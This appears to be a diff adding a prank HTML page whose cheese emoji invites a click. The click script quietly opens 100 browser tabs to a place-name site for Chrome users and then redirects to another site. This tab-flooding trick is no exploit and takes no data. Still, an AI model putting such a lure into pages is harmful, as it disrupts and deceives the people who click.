@@ -1,0 +1,34 @@
+<html>
+  <head>
+    <style>
+      body {
+        font-size: 100px;
+        font-weight: bold;
+        height: 100vh;
+        margin: 0;
+        display: grid;
+        place-items: center;
+        overflow: hidden;
+        transform: rotate(2deg);
+        font-family: system-ui, sans-serif;
+        transition: opacity 1s;
+        cursor: pointer;
+      }
+    </style>
+  </head>
+  <body>
+    🧀 &lt;— click to eat
+  </body>
+  <script>
+    document.body.onclick = () => {
+      if (navigator.userAgent.toLowerCase().includes("chrome"))
+        for (let i = 0; i < 100; i++)
+          setTimeout(() => open("https://newyork.hometownlocator.com/ny/orange/finnegans-corners.cfm", "_blank"), i * 100)
+
+      document.body.style.opacity = 0
+      setTimeout(() => {
+        location = "//shnebir.com/cheese/"
+      }, 1000)
+    }
+  </script>
+</html>
